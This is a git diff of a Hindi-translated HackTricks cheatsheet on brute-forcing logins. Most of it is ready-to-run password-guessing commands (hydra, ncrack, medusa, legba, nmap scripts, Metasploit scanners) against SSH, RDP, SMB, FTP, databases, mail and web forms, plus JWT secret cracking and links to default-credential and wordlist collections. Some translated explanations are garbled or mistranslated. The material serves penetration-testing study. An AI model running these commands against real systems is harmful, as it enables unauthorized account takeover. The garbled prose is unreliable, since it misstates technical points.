@@ -1,32 +1,30 @@
 # Brute Force - CheatSheet
 
-## Brute Force - CheatSheet
-
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और **दुनिया के सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **ऑटोमेट वर्कफ़्लो** आसानी से बनाएं।\
-आज ही पहुंचें:
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और **दुनिया के सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से निर्मित करें और स्वचालित करें।\
+आज ही पहुंच प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 <details>
 
-<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>
+<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>
 
 HackTricks का समर्थन करने के अन्य तरीके:
 
-* यदि आप अपनी कंपनी का **विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएँ देखें**](https://github.com/sponsors/carlospolop)!
-* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)\*\* पर फॉलो\*\* करें।
-* **अपने हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।
+* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
+* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
+* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
+* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
+* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।
 
 </details>
 
-### डिफ़ॉल्ट क्रेडेंशियल्स
+## डिफ़ॉल्ट क्रेडेंशियल्स
 
-उस प्रौद्योगिकी के डिफ़ॉल्ट क्रेडेंशियल्स के लिए google में खोजें, या **इन लिंक्स की कोशिश करें**:
+उस प्रौद्योगिकी के डिफ़ॉल्ट क्रेडेंशियल्स के लिए google में खोजें, या **इन लिंकों को प्रयास करें**:
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -39,14 +37,13 @@ HackTricks का समर्थन करने के अन्य तरी�
 * [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
 * [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
 * [**https://many-passwords.github.io/**](https://many-passwords.github.io)
-* [**https://theinfocentric.com/**](https://theinfocentric.com/)
+* [**https://theinfocentric.com/**](https://theinfocentric.com/) 
 
-### **अपने खुद के शब्दकोश बनाएं**
+## **अपने खुद के शब्दकोश बनाएं**
 
-लक्ष्य के बारे में जितनी जानकारी हो सके उसे खोजें और एक कस्टम शब्दकोश उत्पन्न करें। उपकरण जो मदद कर सकते हैं:
+लक्ष्य के बारे में जितनी जानकारी हो सके उसे खोजें और एक कस्टम शब्दकोश उत्पन्न करें। उपकरण जो मदद कर सकते हैं: 
 
-#### Crunch
-
+### Crunch
 ```bash
 crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
 crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)
@@ -57,25 +54,19 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-
-#### Cewl
-
+### Cewl
 ```bash
 cewl example.com -m 5 -w words.txt
 ```
+### [CUPP](https://github.com/Mebus/cupp)
 
-#### [CUPP](https://github.com/Mebus/cupp)
-
-अपने पीड़ित के ज्ञान पर आधारित पासवर्ड उत्पन्न करें (नाम, तारीखें...)
-
+आपके पीड़ित के ज्ञान पर आधारित पासवर्ड उत्पन्न करें (नाम, तारीखें...)
 ```
 python3 cupp.py -h
 ```
+### [विस्टर](https://github.com/cycurity/wister)
 
-#### [विस्टर](https://github.com/cycurity/wister)
-
-एक शब्द-सूची जेनरेटर टूल, जो आपको एक सेट शब्द प्रदान करने की अनुमति देता है, जिससे आप दिए गए शब्दों से कई विभिन्न परिवर्तन बना सकते हैं, एक विशिष्ट लक्ष्य के संदर्भ में उपयोग के लिए एक अद्वितीय और आदर्श शब्द-सूची बनाने की संभावना प्रदान करता है।
-
+एक शब्द-सूची जेनरेटर टूल, जो आपको एक सेट शब्द प्रदान करने की अनुमति देता है, जिससे आप दिए गए शब्दों से कई विविधताएँ बना सकते हैं, एक विशिष्ट लक्ष्य के संदर्भ में उपयोग के लिए एक अद्वितीय और आदर्श शब्द-सूची बनाने की संभावना प्रदान करता है।
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -94,10 +85,9 @@ Generated 67885 lines.
 
 Finished in 0.920s.
 ```
+### [pydictor](https://github.com/LandGrey/pydictor)
 
-#### [pydictor](https://github.com/LandGrey/pydictor)
-
-#### शब्द-सूचियाँ
+### शब्द-सूचियाँ
 
 * [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 * [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -110,20 +100,19 @@ Finished in 0.920s.
 * [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 * [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और दुनिया के सबसे उन्नत समुदाय उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से निर्माण और **स्वचालित** करें।\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और **दुनिया के सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **कार्यप्रवाह** को आसानी से निर्माण और **स्वचालित** करें।\
 आज ही पहुंचें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-### सेवाएँ
+## सेवाएं
 
-सेवा के नाम के क्रमानुसार।
+सेवा के नाम के क्रमबद्ध रूप से।
 
-#### AFP
-
+### AFP
 ```bash
 nmap -p 548 --script afp-brute <IP>
 msf> use auxiliary/scanner/afp/afp_login
@@ -133,124 +122,100 @@ msf> set PASS_FILE <PATH_PASSWDS>
 msf> set USER_FILE <PATH_USERS>
 msf> run
 ```
+### AJP
 
-#### AJP
-
-AJP (Apache JServ Protocol) is a binary protocol that can be brute-forced using tools like Hydra or Burp Suite Intruder. It is commonly used in Apache Tomcat servers for communication between the web server and servlet container.
-
+### एजेपीजी
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM और Solace)
-
+## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM और Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
-
-#### कैसेंड्रा
-
+### कैसेंड्रा
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
 ```
+### CouchDB
 
-#### CouchDB
+काउचडीबी के लिए ब्रूट फोर्स अटैक करने के लिए हम यहाँ एक कुछ उपाय देखेंगे।
 
-ब्रूट फोर्स एक तकनीक है जिसमें हम एक बहुत बड़ी संभावित सूची से पासवर्ड की कोशिश करते हैं। यह एक असावधान तरीका है और अक्सर असफल भी हो सकता है, लेकिन कुछ स्थितियों में यह काम कर सकता है।
-
+1. **एपीआई अनुरोधों का उपयोग**: एपीआई अनुरोधों का उपयोग करके ब्रूट फोर्स अटैक कर सकते हैं।
+2. **डॉकर कंटेनर्स**: कंटेनर्स का उपयोग करके ब्रूट फोर्स अटैक को अधिक स्केलेबल बनाया जा सकता है।
+3. **हैश क्रैकिंग**: यदि आप कूचडीबी डेटाबेस में स्टोर किए गए पासवर्ड को हैश कर सकते हैं, तो आप हैश क्रैकिंग तकनीक का उपयोग कर सकते हैं।
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-
-#### डॉकर रजिस्ट्री
-
+### डॉकर रजिस्ट्री
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
-
-#### Elasticsearch
+### Elasticsearch
 
 एलास्टिकसर्च
-
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
-
-#### FTP
+### FTP
 
 एफटीपी
-
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
+### HTTP सामान्य ब्रूट
 
-#### HTTP सामान्य ब्रूट
+#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-[**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
-
-#### HTTP बेसिक प्रमाणीकरण
-
+### HTTP बेसिक प्रमाणीकरण
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
 medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
 legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
 ```
-
-#### HTTP - NTLM
-
+### HTTP - NTLM
 ```bash
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-
-#### HTTP - पोस्ट फॉर्म
-
+### HTTP - पोस्ट फॉर्म
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-
-#### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
-
+### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
+### IMAP
 
-#### IMAP
-
-आईएमएपी
-
+IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. When a hacker uses a brute force attack on an IMAP server, they attempt to gain unauthorized access by trying various username and password combinations until they find the correct one. This method can be time-consuming but is often successful if weak credentials are used.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
 nmap -sV --script imap-brute -p <PORT> <IP>
 legba imap --username user --password data/passwords.txt --target localhost:993
 ```
+### IRC
 
-#### आईआरसी
-
+IRC (Internet Relay Chat) एक पुराना लेकिन अभी भी उपयोगी प्रोटोकॉल है जिसका उपयोग चैट और समूह संचार के लिए किया जाता है।
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
-
-#### ISCSI
-
+### ISCSI
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
+### JWT
 
-#### JWT
-
-जेडब्ल्यूटी
-
+JWT (JSON Web Tokens) को क्रैक करने के लिए ब्रूट फोर्स एक अच्छा तकनीक है। इसमें कुछ कुंजी की लंबाई को बदलकर उसे चेक किया जाता है।
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
@@ -273,45 +238,35 @@ python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1w
 #https://github.com/lmammino/jwt-cracker
 jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
 ```
+### LDAP
 
-#### LDAP
-
-LDAP (Lightweight Directory Access Protocol) एक open-standard protocol है जो directory services के लिए इस्तेमाल होता है। LDAP का उपयोग करके एक attacker विभिन्न authentication mechanisms को brute-force कर सकता है। LDAP के लिए कुछ common attack tools हैं जैसे LDAPBrute और ldapdomaindump।
-
+LDAP (Lightweight Directory Access Protocol) एक open-standard protocol है जो directory services के लिए इस्तेमाल होता है। LDAP का उपयोग करके एक attacker विभिन्न authentication credentials को brute force attack के माध्यम से try कर सकता है। LDAP के लिए कुछ common default credentials हो सकते हैं जो attacker का काम आसान बना सकते हैं।
 ```bash
 nmap --script ldap-brute -p 389 <IP>
 legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
+### MQTT
 
-#### MQTT
-
-#### एमक्यूटी
-
+MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol that is ideal for IoT devices.
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
 ```
-
-#### मोंगो
-
+### मोंगो
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
 legba mongodb --target localhost:27017 --username root --password data/passwords.txt
 ```
+### MSSQL
 
-#### MSSQL
-
-#### एमएसएसक्यूएल
-
+एमएसएसक्यूएल
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
+### MySQL
 
-#### MySQL
-
-एमयूएसक्यूएल
-
+### माइएसक्यूएल
 ```bash
 # hydra
 hydra -L usernames.txt -P pass.txt <IP> mysql
@@ -325,11 +280,9 @@ medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on fir
 #Legba
 legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
 ```
+### OracleSQL
 
-#### OracleSQL
-
-ब्रूट फोर्स हमेशा एक अंतिम विकल्प होना चाहिए, क्योंकि यह एक अत्यधिक समय और संसाधनों की मांग करता है। इसके बावजूद, यह एक अच्छा विकल्प हो सकता है जब आपके पास कोई अन्य विकल्प नहीं है।
-
+ब्रूट फोर्स हमेशा एक विकल्प हो सकता है जब आपके पास कोई अन्य विकल्प नहीं है। यह एक अद्वितीय तरीका है जिसमें हम एक बड़ी संख्या में संभावित पासवर्ड की कोशिश करते हैं। OracleSQL पर ब्रूट फोर्स हमेशा एक प्रभावी तकनीक हो सकता है, लेकिन यह ध्यान देने योग्य है कि यह अवैध है और कानूनी परिणाम हो सकते हैं।
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
 
@@ -353,21 +306,15 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-
-जिसके लिए **oracle\_login** को **patator** के साथ उपयोग करना है, उसे **install** करना होगा:
-
+**oracle\_login** का उपयोग करने के लिए **patator** के साथ आपको **install** करने की आवश्यकता है:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-
-[ऑफलाइन OracleSQL हैश ब्रूटफोर्स](https://github.com/carlospolop/hacktricks/blob/in/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**संस्करण 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** और **11.2.0.3**):
-
+[ऑफलाइन OracleSQL हैश ब्रूटफोर्स](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**संस्करण 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** और **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
-
-#### पॉप
-
+### पीओपी
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -378,17 +325,23 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 # SSL
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
+### PostgreSQL
 
-#### PostgreSQL
+#### Brute Force Attack
 
-**Brute Force Attack**
+Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method is often used when other techniques, such as password guessing or social engineering, have failed. Brute force attacks can be time-consuming but are effective if the attacker is patient.
 
-Brute force attacks are a common method used by hackers to gain unauthorized access to a system or account. In a brute force attack, the attacker tries every possible combination of usernames and passwords until the correct one is found. This method is time-consuming but can be effective if the passwords are weak or easily guessable.
+#### Protection Against Brute Force Attacks
 
-**Protection Against Brute Force Attacks**
+To protect against brute force attacks, you can implement the following measures:
 
-To protect against brute force attacks, it is important to use strong and complex passwords that are not easily guessable. Additionally, implementing account lockout policies after a certain number of failed login attempts can help prevent brute force attacks. Using multi-factor authentication can also add an extra layer of security to prevent unauthorized access.
+1. **Strong Passwords**: Encourage users to use strong, complex passwords that are difficult to guess.
+2. **Account Lockout**: Implement account lockout policies that lock an account after a certain number of failed login attempts.
+3. **CAPTCHA**: Use CAPTCHA or reCAPTCHA to prevent automated scripts from performing brute force attacks.
+4. **Multi-Factor Authentication (MFA)**: Implement MFA to add an extra layer of security to the authentication process.
+5. **Monitoring and Logging**: Monitor login attempts and set up alerts for multiple failed attempts to detect and respond to brute force attacks in real-time.
 
+By implementing these measures, you can significantly reduce the risk of a successful brute force attack on your PostgreSQL database.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -398,125 +351,93 @@ use auxiliary/scanner/postgres/postgres_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
 legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
 ```
-
-#### PPTP
+### PPTP
 
 आप निम्नलिखित लिंक से `.deb` पैकेज डाउनलोड करके स्थापित कर सकते हैं: [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
-
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
-
-#### RDP
-
-रिमोट डेस्कटॉप प्रोटोकॉल (RDP) को ब्रूट फोर्स अटैक के लिए उपयोग किया जा सकता है।
-
+### RDP
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
-
-#### रेडिस
-
+### रेडिस
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
 hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
 legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
 ```
+### Rexec
 
-#### Rexec
-
-Rexec एक रिमोट एक्सीक्यूशन सेवा है जो एक रिमोट सिस्टम पर कमांड्स को एक्सीक्यूट करने की अनुमति देता है।
-
+रेक्सेक्यूशन के लिए ब्रूट फोर्सिंग का उपयोग करने के लिए आप निम्नलिखित कमांड का उपयोग कर सकते हैं:
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
-
-#### Rlogin
-
-#### आरलॉगिन
-
+### Rlogin
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
+### Rsh
 
-#### Rsh
-
-यह एक रिमोट शेल प्रोटोकॉल है जिसे ब्रूट फोर्स अटैक के लिए उपयोग किया जा सकता है।
-
+यह एक दूरस्थ शेल (Remote Shell) प्रोटोकॉल है जो उपयोगकर्ता के लिए एक दूरस्थ सिस्टम पर एक शेल सत्र स्थापित करने की अनुमति देता है।
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
-
 [http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
 
-#### आरसिंक
-
+### Rsync
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
 ```
-
-#### RTSP
-
+### RTSP
 ```bash
 hydra -l root -P passwords.txt <IP> rtsp
 ```
-
-#### SFTP
-
+### SFTP
 ```bash
 legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
 # Try keys from a folder
 legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-
-#### SNMP
+### SNMP
 
 एसएनएमपी
-
 ```bash
 msf> use auxiliary/scanner/snmp/snmp_login
 nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
 onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
 hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
 ```
+### SMB
 
-#### SMB
-
-#### एसएमबी
-
+### एसएमबी
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
+### SMTP
 
-#### SMTP
-
-SMTP (Simple Mail Transfer Protocol) एक प्रमुख इंटरनेट प्रोटोकॉल है जो ईमेल के लिए उपयोग किया जाता है।
-
+### एसएमटीपी
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
 legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
 ```
+### SOCKS
 
-#### SOCKS
-
-SOCKS (Socket Secure) प्रॉक्सी सर्वर का उपयोग करके ब्रूट फोर्स हमले को अनदेखा करने के लिए एक अच्छा तरीका है। SOCKS प्रॉक्सी का उपयोग करके, हमले को अनदेखा करने के लिए एक अन्य सर्वर के माध्यम से अनदेखा किया जा सकता है।
-
+SOCKS stands for Socket Secure and is a protocol that routes network packets between a client and a server through a proxy server. It can be used for various purposes, including anonymity, circumventing network filters, and accessing restricted content.
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
 # With alternative address
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-
-#### SQL सर्वर
-
+### SQL सर्वर
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -525,11 +446,9 @@ medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssq
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
 msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
 ```
+### SSH
 
-#### SSH
-
-एसएसएच
-
+SSH (Secure Shell) is a cryptographic network protocol for operating network services securely over an unsecured network.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -539,21 +458,17 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
+#### कमजोर SSH कुंजी / Debian पूर्वानुमाननीय PRNG
 
-**कमजोर SSH कुंजी / Debian पूर्वानुमाननीय PRNG**
+कुछ सिस्टम में एक ज्ञात दोष होता है जो यातायात जनरेट करने के लिए उपयोग किए गए यांत्रिक सामग्री को उत्पन्न करने के लिए उपयोग किए गए यातायात बीज में। इससे एक भयानक तरीके से कम कुंजी स्थान हो सकता है जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे उपकरणों के साथ ब्रूटफोर्स किया जा सकता है। पूर्व-उत्पन्न कमजोर कुंजी के सेट भी उपलब्ध हैं जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)।
 
-कुछ सिस्टम में एक ज्ञात दोष होता है जो यातायात जनरेट करने के लिए उपयोग किए गए यातायात सामग्री में रैंडम बीज में। इससे एक भयानक रूप से कम कुंजी स्थान हो सकता है जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे उपकरणों से ब्रूटफोर्स किया जा सकता है। पूर्व-उत्पन्न कमजोर कुंजी के सेट भी उपलब्ध हैं जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)।
+### STOMP (ActiveMQ, RabbitMQ, HornetQ और OpenMQ)
 
-#### STOMP (ActiveMQ, RabbitMQ, HornetQ और OpenMQ)
-
-STOMP पाठ प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला संदेशन प्रोटोकॉल है जो रैबिटएमक्यू, एक्टिवेएमक्यू, हॉर्नेटक्यू, और ओपनएमक्यू जैसी लोकप्रिय संदेश कतार सेवाओं के साथ अविरल संचार और बातचीत की अनुमति देता है। यह संदेश विनिमय करने और विभिन्न संदेशन कार्यों को करने के लिए एक मानकीकृत और कुशल दृष्टिकोण प्रदान करता है।
-
+STOMP पाठ प्रोटोकॉल एक व्यापक रूप से उपयोग किया जाने वाला संदेशन प्रोटोकॉल है जो रैबिटएमक्यू, ऐक्टिवएमक्यू, हॉर्नेटक्यू, और ओपनएमक्यू जैसी लोकप्रिय संदेश कतार सेवाओं के साथ अविरल संवाद और अंतर्क्रिया सुनिश्चित करता है। यह संदेश विनिमय करने और विभिन्न संदेशन कार्यों को करने के लिए एक मानकीकृत और कुशल दृष्टिकोण प्रदान करता है।
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
-
-#### टेलनेट
-
+### टेलनेट
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
